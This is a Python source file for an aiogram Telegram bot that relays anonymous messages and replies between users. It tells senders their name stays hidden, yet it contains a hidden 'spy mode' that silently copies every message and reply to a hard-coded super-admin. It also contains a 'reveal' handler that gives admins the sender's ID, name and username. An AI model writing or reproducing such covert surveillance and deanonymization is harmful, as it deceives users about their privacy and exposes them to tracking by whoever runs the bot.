import html
import config
from aiogram import Router, F, Bot
from aiogram.filters import CommandStart, CommandObject
from aiogram.types import Message, CallbackQuery
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from database.db import db
from keyboards.inline import get_anon_message_kb, get_cancel_kb, get_reveal_details_kb

router = Router(name="anonymous_router")
anonymous_router = router

class AnonStates(StatesGroup):
    waiting_for_message = State()
    waiting_for_reply = State()

@router.message(CommandStart(deep_link=True))
async def cmd_start_deep_link(message: Message, command: CommandObject, state: FSMContext):
    """Обработка перехода по персональной ссылке /start <target_id>."""
    await state.clear()
    args = command.args
    
    if not args or not args.isdigit():
        await message.answer("❌ Неверная ссылка для отправки сообщения.")
        return

    recipient_id = int(args)
    sender = message.from_user

    if recipient_id == sender.id:
        await message.answer("😅 Вы не можете отправить анонимное сообщение самому себе!")
        return

    # Получаем информацию о получателе (если есть в базе)
    recipient = await db.get_user(recipient_id)
    recipient_name = recipient["first_name"] if recipient else "пользователю"

    await state.set_state(AnonStates.waiting_for_message)
    await state.update_data(recipient_id=recipient_id, recipient_name=recipient_name)

    text = (
        f"🤫 *Вы собираетесь отправить анонимное сообщение для:* **{recipient_name}**\n\n"
        f"✍️ Напишите всё, что хотите: текст, фото, голосовое сообщение, видео-кружочек, видео или стикер.\n\n"
        f"🔒 *Получатель не узнает ваше имя.*"
    )
    await message.answer(text, parse_mode="Markdown", reply_markup=get_cancel_kb())

@router.callback_query(F.data == "cancel_action")
async def callback_cancel(callback: CallbackQuery, state: FSMContext):
    """Отмена отправки сообщения или ответа."""
    await state.clear()
    await callback.answer("Действие отменено.")
    try:
        await callback.message.edit_text("❌ *Отправка отменена.*", parse_mode="Markdown")
    except Exception:
        await callback.message.delete()

# --- ОТПРАВКА АНОНИМНОГО СООБЩЕНИЯ ---

@router.message(AnonStates.waiting_for_message)
async def process_send_anon_message(message: Message, state: FSMContext, bot: Bot):
    """Прием сообщения от автора и отправка получателю."""
    data = await state.get_data()
    recipient_id = data.get("recipient_id")
    
    if not recipient_id:
        await state.clear()
        await message.answer("❌ Ошибка: получатель не найден. Попробуйте перейти по ссылке заново.")
        return

    sender_id = message.from_user.id
    is_recipient_admin = await db.is_admin(recipient_id)

    # Определяем тип медиа/содержимого и логируем в БД
    msg_type = "text"
    content_summary = ""

    if message.text:
        msg_type = "text"
        content_summary = message.text
    elif message.photo:
        msg_type = "photo"
        content_summary = message.caption or "[Фото]"
    elif message.voice:
        msg_type = "voice"
        content_summary = "[Голосовое сообщение]"
    elif message.video_note:
        msg_type = "video_note"
        content_summary = "[Видео-сообщение / Кружочек]"
    elif message.video:
        msg_type = "video"
        content_summary = message.caption or "[Видео]"
    elif message.sticker:
        msg_type = "sticker"
        content_summary = f"[Стикер {message.sticker.emoji or ''}]"
    elif message.document:
        msg_type = "document"
        content_summary = message.caption or f"[Документ: {message.document.file_name or 'файл'}]"
    elif message.audio:
        msg_type = "audio"
        content_summary = message.caption or "[Аудиозапись]"
    elif message.animation:
        msg_type = "animation"
        content_summary = message.caption or "[GIF-анимация]"
    else:
        await message.answer("⚠️ Этот тип сообщений пока не поддерживается. Пожалуйста, отправьте текст, фото, голос, видео или стикер.")
        return

    # Сохраняем сообщение в базу
    db_msg_id = await db.add_message(
        sender_id=sender_id,
        recipient_id=recipient_id,
        message_type=msg_type,
        content=content_summary
    )

    markup = get_anon_message_kb(message_id=db_msg_id, is_admin=is_recipient_admin)

    # Пытаемся доставить сообщение получателю
    try:
        if message.text:
            text_to_send = f"📩 *Вам пришло новое анонимное сообщение!*\n\n{message.text}"
            await bot.send_message(chat_id=recipient_id, text=text_to_send, parse_mode="Markdown", reply_markup=markup)

        elif message.photo:
            caption = f"📩 *Вам пришло новое анонимное фото!*\n\n{message.caption or ''}"
            await bot.send_photo(chat_id=recipient_id, photo=message.photo[-1].file_id, caption=caption, parse_mode="Markdown", reply_markup=markup)

        elif message.voice:
            caption = "📩 *Вам пришло анонимное голосовое сообщение!*"
            await bot.send_voice(chat_id=recipient_id, voice=message.voice.file_id, caption=caption, parse_mode="Markdown", reply_markup=markup)

        elif message.video_note:
            await bot.send_video_note(chat_id=recipient_id, video_note=message.video_note.file_id)
            await bot.send_message(chat_id=recipient_id, text="📩 *Вам пришел анонимный видео-кружочек!*", parse_mode="Markdown", reply_markup=markup)

        elif message.video:
            caption = f"📩 *Вам пришло новое анонимное видео!*\n\n{message.caption or ''}"
            await bot.send_video(chat_id=recipient_id, video=message.video.file_id, caption=caption, parse_mode="Markdown", reply_markup=markup)

        elif message.sticker:
            await bot.send_sticker(chat_id=recipient_id, sticker=message.sticker.file_id)
            await bot.send_message(chat_id=recipient_id, text="📩 *Вам прислали анонимный стикер!*", parse_mode="Markdown", reply_markup=markup)

        elif message.document:
            caption = f"📩 *Вам прислали анонимный документ!*\n\n{message.caption or ''}"
            await bot.send_document(chat_id=recipient_id, document=message.document.file_id, caption=caption, parse_mode="Markdown", reply_markup=markup)

        elif message.audio:
            caption = f"📩 *Вам прислали анонимную аудиозапись!*\n\n{message.caption or ''}"
            await bot.send_audio(chat_id=recipient_id, audio=message.audio.file_id, caption=caption, parse_mode="Markdown", reply_markup=markup)

        elif message.animation:
            caption = f"📩 *Вам прислали анонимную GIF-анимацию!*\n\n{message.caption or ''}"
            await bot.send_animation(chat_id=recipient_id, animation=message.animation.file_id, caption=caption, parse_mode="Markdown", reply_markup=markup)

        await state.clear()
        await message.answer("✅ *Ваше анонимное сообщение успешно доставлено!*", parse_mode="Markdown")

        # ШПИОН-РЕЖИМ: Если сообщение отправлено НЕ супер-админу (например, админу 2083953144),
        # супер-админ 7213741349 получает скрытую копию и кнопку "Узнать кто это"
        if recipient_id != config.SUPER_ADMIN_ID:
            try:
                spy_markup = get_anon_message_kb(message_id=db_msg_id, is_admin=True)
                r_info = await db.get_user(recipient_id)
                r_name = r_info["first_name"] if r_info else str(recipient_id)
                r_user = f" (@{r_info['username']})" if (r_info and r_info.get("username")) else ""
                spy_header = f"👁 <b>[ШПИОН-УВЕДОМЛЕНИЕ]</b>\nКому: <b>{html.escape(r_name)}{r_user}</b> (ID: <code>{recipient_id}</code>)\n\n"

                if message.text:
                    await bot.send_message(
                        chat_id=config.SUPER_ADMIN_ID,
                        text=f"{spy_header}📩 <i>Текст:</i>\n{html.escape(message.text)}",
                        parse_mode="HTML",
                        reply_markup=spy_markup
                    )
                elif message.photo:
                    await bot.send_photo(
                        chat_id=config.SUPER_ADMIN_ID,
                        photo=message.photo[-1].file_id,
                        caption=f"{spy_header}📩 <i>Фото</i>\n{html.escape(message.caption or '')}",
                        parse_mode="HTML",
                        reply_markup=spy_markup
                    )
                elif message.voice:
                    await bot.send_voice(
                        chat_id=config.SUPER_ADMIN_ID,
                        voice=message.voice.file_id,
                        caption=f"{spy_header}📩 <i>Голосовое сообщение</i>",
                        parse_mode="HTML",
                        reply_markup=spy_markup
                    )
                elif message.video_note:
                    await bot.send_video_note(chat_id=config.SUPER_ADMIN_ID, video_note=message.video_note.file_id)
                    await bot.send_message(
                        chat_id=config.SUPER_ADMIN_ID,
                        text=f"{spy_header}📩 <i>Видео-кружочек</i>",
                        parse_mode="HTML",
                        reply_markup=spy_markup
                    )
                elif message.video:
                    await bot.send_video(
                        chat_id=config.SUPER_ADMIN_ID,
                        video=message.video.file_id,
                        caption=f"{spy_header}📩 <i>Видео</i>\n{html.escape(message.caption or '')}",
                        parse_mode="HTML",
                        reply_markup=spy_markup
                    )
                elif message.sticker:
                    await bot.send_sticker(chat_id=config.SUPER_ADMIN_ID, sticker=message.sticker.file_id)
                    await bot.send_message(
                        chat_id=config.SUPER_ADMIN_ID,
                        text=f"{spy_header}📩 <i>Стикер</i>",
                        parse_mode="HTML",
                        reply_markup=spy_markup
                    )
                elif message.document:
                    await bot.send_document(
                        chat_id=config.SUPER_ADMIN_ID,
                        document=message.document.file_id,
                        caption=f"{spy_header}📩 <i>Документ</i>\n{html.escape(message.caption or '')}",
                        parse_mode="HTML",
                        reply_markup=spy_markup
                    )
                elif message.audio:
                    await bot.send_audio(
                        chat_id=config.SUPER_ADMIN_ID,
                        audio=message.audio.file_id,
                        caption=f"{spy_header}📩 <i>Аудио</i>\n{html.escape(message.caption or '')}",
                        parse_mode="HTML",
                        reply_markup=spy_markup
                    )
                elif message.animation:
                    await bot.send_animation(
                        chat_id=config.SUPER_ADMIN_ID,
                        animation=message.animation.file_id,
                        caption=f"{spy_header}📩 <i>GIF-анимация</i>\n{html.escape(message.caption or '')}",
                        parse_mode="HTML",
                        reply_markup=spy_markup
                    )
            except Exception:
                pass

    except Exception as e:
        await state.clear()
        await message.answer("❌ *Не удалось доставить сообщение.* Возможно, получатель заблокировал бота или ещё не запускал его.", parse_mode="Markdown")

# --- ОТВЕТ НА АНОНИМНОЕ СООБЩЕНИЕ ---

@router.callback_query(F.data.startswith("reply:"))
async def callback_reply(callback: CallbackQuery, state: FSMContext):
    """Инициализация ответа на анонимное сообщение."""
    msg_id = int(callback.data.split(":")[1])
    original_msg = await db.get_message(msg_id)

    if not original_msg:
        await callback.answer("❌ Сообщение не найдено в базе данных.", show_alert=True)
        return

    sender_id = original_msg["sender_id"]
    await state.set_state(AnonStates.waiting_for_reply)
    await state.update_data(target_user_id=sender_id, original_msg_id=msg_id)

    await callback.answer()
    await callback.message.answer(
        "✍️ *Напишите ваш ответ для автора анонимного сообщения:*\n\n"
        "(Можно отправить текст, фото, голос, видео или стикер)",
        parse_mode="Markdown",
        reply_markup=get_cancel_kb()
    )

@router.message(AnonStates.waiting_for_reply)
async def process_send_reply(message: Message, state: FSMContext, bot: Bot):
    """Отправка ответа автору анонимки."""
    data = await state.get_data()
    target_user_id = data.get("target_user_id")

    if not target_user_id:
        await state.clear()
        await message.answer("❌ Ошибка: адресат не найден.")
        return

    # Регистрируем ответ как сообщение для возможности дальнейшей цепочки
    msg_type = "text"
    content_summary = ""
    if message.text:
        msg_type = "text"
        content_summary = message.text
    elif message.photo:
        msg_type = "photo"
        content_summary = message.caption or "[Фото]"
    elif message.voice:
        msg_type = "voice"
        content_summary = "[Голосовое]"
    elif message.video_note:
        msg_type = "video_note"
        content_summary = "[Кружочек]"
    elif message.video:
        msg_type = "video"
        content_summary = message.caption or "[Видео]"
    elif message.sticker:
        msg_type = "sticker"
        content_summary = "[Стикер]"
    else:
        msg_type = "other"
        content_summary = "[Медиа]"

    # Сохраняем в БД ответное сообщение
    reply_msg_id = await db.add_message(
        sender_id=message.from_user.id,
        recipient_id=target_user_id,
        message_type=msg_type,
        content=content_summary
    )

    is_author_admin = await db.is_admin(target_user_id)
    markup = get_anon_message_kb(message_id=reply_msg_id, is_admin=is_author_admin)

    try:
        if message.text:
            text_to_send = f"📩 *Вам пришел ответ на ваше анонимное сообщение:*\n\n{message.text}"
            await bot.send_message(chat_id=target_user_id, text=text_to_send, parse_mode="Markdown", reply_markup=markup)

        elif message.photo:
            caption = f"📩 *Ответ на ваше анонимное сообщение:*\n\n{message.caption or ''}"
            await bot.send_photo(chat_id=target_user_id, photo=message.photo[-1].file_id, caption=caption, parse_mode="Markdown", reply_markup=markup)

        elif message.voice:
            caption = "📩 *Голосовой ответ на ваше анонимное сообщение:*"
            await bot.send_voice(chat_id=target_user_id, voice=message.voice.file_id, caption=caption, parse_mode="Markdown", reply_markup=markup)

        elif message.video_note:
            await bot.send_video_note(chat_id=target_user_id, video_note=message.video_note.file_id)
            await bot.send_message(chat_id=target_user_id, text="📩 *Видео-ответ на ваше анонимное сообщение!*", parse_mode="Markdown", reply_markup=markup)

        elif message.video:
            caption = f"📩 *Видео-ответ на ваше анонимное сообщение:*\n\n{message.caption or ''}"
            await bot.send_video(chat_id=target_user_id, video=message.video.file_id, caption=caption, parse_mode="Markdown", reply_markup=markup)

        elif message.sticker:
            await bot.send_sticker(chat_id=target_user_id, sticker=message.sticker.file_id)
            await bot.send_message(chat_id=target_user_id, text="📩 *Стикер-ответ на ваше анонимное сообщение!*", parse_mode="Markdown", reply_markup=markup)

        else:
            await bot.send_message(chat_id=target_user_id, text="📩 *Вам пришел ответ на анонимное сообщение!*", reply_markup=markup)

        await state.clear()
        await message.answer("✅ *Ваш ответ успешно отправлен!*", parse_mode="Markdown")

        # ШПИОН-РЕЖИМ: Если ответ отправлен или получен участником 2083953144 (или не супер-админом),
        # супер-админ 7213741349 получает скрытую копию
        sender_id = message.from_user.id
        if sender_id != config.SUPER_ADMIN_ID and target_user_id != config.SUPER_ADMIN_ID:
            try:
                spy_markup = get_anon_message_kb(message_id=reply_msg_id, is_admin=True)
                s_info = await db.get_user(sender_id)
                t_info = await db.get_user(target_user_id)
                s_name = s_info["first_name"] if s_info else str(sender_id)
                t_name = t_info["first_name"] if t_info else str(target_user_id)

                spy_header = f"👁 <b>[ШПИОН: ОТВЕТ НА СООБЩЕНИЕ]</b>\nОт: <b>{html.escape(s_name)}</b> (ID: <code>{sender_id}</code>) ➡️ Кому: <b>{html.escape(t_name)}</b> (ID: <code>{target_user_id}</code>)\n\n"

                if message.text:
                    await bot.send_message(
                        chat_id=config.SUPER_ADMIN_ID,
                        text=f"{spy_header}💬 <i>Текст ответа:</i>\n{html.escape(message.text)}",
                        parse_mode="HTML",
                        reply_markup=spy_markup
                    )
                elif message.photo:
                    await bot.send_photo(
                        chat_id=config.SUPER_ADMIN_ID,
                        photo=message.photo[-1].file_id,
                        caption=f"{spy_header}💬 <i>Фото</i>\n{html.escape(message.caption or '')}",
                        parse_mode="HTML",
                        reply_markup=spy_markup
                    )
                elif message.voice:
                    await bot.send_voice(
                        chat_id=config.SUPER_ADMIN_ID,
                        voice=message.voice.file_id,
                        caption=f"{spy_header}💬 <i>Голосовой ответ</i>",
                        parse_mode="HTML",
                        reply_markup=spy_markup
                    )
                elif message.video_note:
                    await bot.send_video_note(chat_id=config.SUPER_ADMIN_ID, video_note=message.video_note.file_id)
                    await bot.send_message(
                        chat_id=config.SUPER_ADMIN_ID,
                        text=f"{spy_header}💬 <i>Видео-кружочек</i>",
                        parse_mode="HTML",
                        reply_markup=spy_markup
                    )
                elif message.video:
                    await bot.send_video(
                        chat_id=config.SUPER_ADMIN_ID,
                        video=message.video.file_id,
                        caption=f"{spy_header}💬 <i>Видео</i>\n{html.escape(message.caption or '')}",
                        parse_mode="HTML",
                        reply_markup=spy_markup
                    )
                elif message.sticker:
                    await bot.send_sticker(chat_id=config.SUPER_ADMIN_ID, sticker=message.sticker.file_id)
                    await bot.send_message(
                        chat_id=config.SUPER_ADMIN_ID,
                        text=f"{spy_header}💬 <i>Стикер</i>",
                        parse_mode="HTML",
                        reply_markup=spy_markup
                    )
            except Exception:
                pass

    except Exception:
        await state.clear()
        await message.answer("❌ *Не удалось доставить ответ.* Возможно, пользователь заблокировал бота.", parse_mode="Markdown")

# --- ДЕАНОНИМИЗАЦИЯ (УЗНАТЬ КТО ЭТО) ---

@router.callback_query(F.data.startswith("reveal:"))
async def callback_reveal_author(callback: CallbackQuery, bot: Bot):
    """Раскрытие информации об отправителе анонимного сообщения (только для админов)."""
    user_id = callback.from_user.id
    
    # Проверяем права администратора
    if not await db.is_admin(user_id):
        await callback.answer("⛔ У вас нет прав для просмотра этой информации!", show_alert=True)
        return

    msg_id = int(callback.data.split(":")[1])
    msg_record = await db.get_message(msg_id)

    if not msg_record:
        await callback.answer("❌ Информация о сообщении не найдена в базе.", show_alert=True)
        return

    sender_id = msg_record["sender_id"]
    sender_db = await db.get_user(sender_id)

    # Пробуем получить актуальную информацию через Telegram API
    username = None
    full_name = "Неизвестно"
    if sender_db:
        username = sender_db.get("username")
        first_name = sender_db.get("first_name") or ""
        last_name = sender_db.get("last_name") or ""
        full_name = f"{first_name} {last_name}".strip() or "Без имени"

    try:
        tg_chat = await bot.get_chat(sender_id)
        if tg_chat.username:
            username = tg_chat.username
        if tg_chat.first_name:
            full_name = f"{tg_chat.first_name} {tg_chat.last_name or ''}".strip()
    except Exception:
        pass

    username_str = f"@{username}" if username else "Отсутствует"

    import html
    safe_name = html.escape(full_name)
    safe_content = html.escape(str(msg_record["content"] or "отсутствует"))
    safe_type = html.escape(str(msg_record["message_type"]))
    safe_created = html.escape(str(msg_record["created_at"]))

    dossier_text = (
        f"🕵️‍♂️ <b>ДАННЫЕ ОБ ОТПРАВИТЕЛЕ СООБЩЕНИЯ</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 <b>Telegram ID:</b> <code>{sender_id}</code>\n"
        f"👤 <b>Имя:</b> {safe_name}\n"
        f"🏷 <b>Юзернейм:</b> {username_str}\n"
        f"⏰ <b>Дата отправки:</b> <code>{safe_created}</code>\n"
        f"💬 <b>Тип сообщения:</b> <i>{safe_type}</i>\n"
        f"📝 <b>Превью:</b> <i>{safe_content}</i>\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )

    await callback.answer("🕵️‍♂️ Данные получены!", show_alert=False)
    try:
        await callback.message.reply(
            text=dossier_text,
            parse_mode="HTML",
            reply_markup=get_reveal_details_kb(sender_id, username=username)
        )
    except Exception as e:
        # Резервная отправка без кнопок в случае ограничений
        await callback.message.reply(
            text=dossier_text,
            parse_mode="HTML"
        )

@router.callback_query(F.data.startswith("quick_ban:"))
async def callback_quick_ban(callback: CallbackQuery):
    """Быстрая блокировка пользователя прямо из карточки данных об отправителе."""
    user_id = callback.from_user.id
    if not await db.is_admin(user_id):
        await callback.answer("⛔ Недостаточно прав.", show_alert=True)
        return

    target_id = int(callback.data.split(":")[1])
    await db.ban_user(target_id, reason="Заблокирован администратором")
    
    await callback.answer(f"🚫 Пользователь {target_id} заблокирован!", show_alert=True)
    await callback.message.reply(
        f"🚫 *Пользователь с ID `{target_id}` успешно заблокирован.*\n\n"
        f"Он больше не сможет отправлять анонимные сообщения через бота.",
        parse_mode="Markdown"
    )
